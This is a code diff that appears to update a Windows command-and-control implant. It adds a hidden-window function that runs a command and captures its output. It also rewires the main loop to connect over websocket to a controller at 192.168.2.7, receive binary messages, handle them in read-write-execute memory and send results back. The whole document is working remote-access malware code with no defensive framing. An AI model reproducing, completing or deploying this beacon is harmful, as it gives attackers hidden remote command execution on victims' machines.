@@ -17,47 +17,137 @@ bool handleMessage(
     PVOID execution_mem
 );
 
+#include <windows.h>
+
+char* runCommand(const char* cmd) {
+    HANDLE hRead = NULL;
+    HANDLE hWrite = NULL;
+
+    SECURITY_ATTRIBUTES sa{};
+    sa.nLength = sizeof(sa);
+    sa.bInheritHandle = TRUE;
+
+    // create pipe
+    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
+        return NULL;
+    }
+
+    // prevent read handle from being inherited
+    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
+
+    STARTUPINFOA si{};
+    PROCESS_INFORMATION pi{};
+    si.cb = sizeof(si);
+
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdOutput = hWrite;
+    si.hStdError  = hWrite;
+
+    char bufferCmd[1024];
+    lstrcpynA(bufferCmd, cmd, 1024);
+
+    BOOL ok = CreateProcessA(
+        NULL,
+        bufferCmd,
+        NULL,
+        NULL,
+        TRUE,               // must be TRUE for pipe inheritance
+        CREATE_NO_WINDOW,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    );
+
+    if (!ok) {
+        CloseHandle(hRead);
+        CloseHandle(hWrite);
+        return NULL;
+    }
+
+    CloseHandle(hWrite); // parent doesn't need write end
+
+    // read output
+    char tmp[4096];
+    DWORD bytesRead;
+
+    // allocate initial buffer
+    size_t capacity = 8192;
+    size_t size = 0;
+    char* output = (char*)HeapAlloc(GetProcessHeap(), 0, capacity);
+    if (!output) {
+        CloseHandle(hRead);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return NULL;
+    }
+
+    while (ReadFile(hRead, tmp, sizeof(tmp), &bytesRead, NULL) && bytesRead > 0) {
+        // grow buffer if needed
+        if (size + bytesRead + 1 > capacity) {
+            capacity *= 2;
+            char* newBuf = (char*)HeapReAlloc(GetProcessHeap(), 0, output, capacity);
+            if (!newBuf) break;
+            output = newBuf;
+        }
+
+        CopyMemory(output + size, tmp, bytesRead);
+        size += bytesRead;
+    }
+
+    output[size] = '\0';
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    CloseHandle(hRead);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+
+    return output;
+}
+
 int main() {
+    //DebugBreak();
+    //char command[] = "whoami";
+    //char *output = runCommand(command);
     PVOID mem = getMem(0x1000, PAGE_EXECUTE_READWRITE);
     scratchpad = getMem(0x100000, PAGE_READWRITE);
 
-    const wchar_t* host = L"192.168.64.1";
-    const INTERNET_PORT port = 443;
-    const bool useHttps = true;
+    const char* host = "ws://192.168.2.7";
 
-    wchar_t identifier[37];
+    char identifier[37];
     random_uuid(identifier);
 
-    wchar_t path[128];
-    const wchar_t* basePath = L"/api/v1/anon/agent/ws/";
+    char path[128];
+    const char* basePath = "/api/v1/anon/agent/ws/";
 
-    size_t baseLen = wcslen(basePath);
-    size_t idLen = wcslen(identifier);
+    size_t baseLen = strlen(basePath);
+    size_t idLen = strlen(identifier);
 
     if (baseLen + idLen + 1 > sizeof(path) / sizeof(wchar_t)) {
         return 1;
     }
-
-    wcscpy(path, basePath);
-    wcscat(path, identifier);
+    strcpy(path, host);
+    strcat(path, basePath);
+    strcat(path, identifier);
 
     WebSocketClient client = {};
 
-    if (!connectWebSocket(client, host, port, path, useHttps)) {
-        cleanup(client);
+    if (!connectWebSocket(client, path)) {
         return 1;
     }
-
-    char *messageBuffer = (char*) getMem(0x100000, PAGE_READWRITE);
-    char *responseBuffer = (char*) getMem(0x100000, PAGE_READWRITE);
+    size_t MESSAGE_BUFFER_SIZE = 0x1000;
+    size_t RESPONSE_BUFFER_SIZE = 0x100000;
+    char *messageBuffer = new char[MESSAGE_BUFFER_SIZE];
+    char *responseBuffer = new char[RESPONSE_BUFFER_SIZE];
     size_t messageSize = 0;
     size_t responseSize = 0;
 
     while (true) {
         if (!receiveBinary(
-                client.websocket,
+                client,
                 messageBuffer,
-                0x100000,
+                MESSAGE_BUFFER_SIZE,
                 messageSize)) {
             break;
         }
@@ -66,29 +156,16 @@ int main() {
                 messageBuffer,
                 messageSize,
                 responseBuffer,
-                0x100000,
+                RESPONSE_BUFFER_SIZE,
                 responseSize,
                 mem)) {
             break;
         }
 
-        if (!sendBinary(client.websocket, responseBuffer, responseSize)) {
+        if (!sendBinary(client, responseBuffer, responseSize)) {
             break;
         }
     }
 
-    DWORD closeResult = WinHttpWebSocketClose(
-        client.websocket,
-        WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS,
-        nullptr,
-        0
-    );
-
-    if (closeResult != NO_ERROR) {
-        cleanup(client);
-        return 1;
-    }
-
-    cleanup(client);
     return 0;
 }
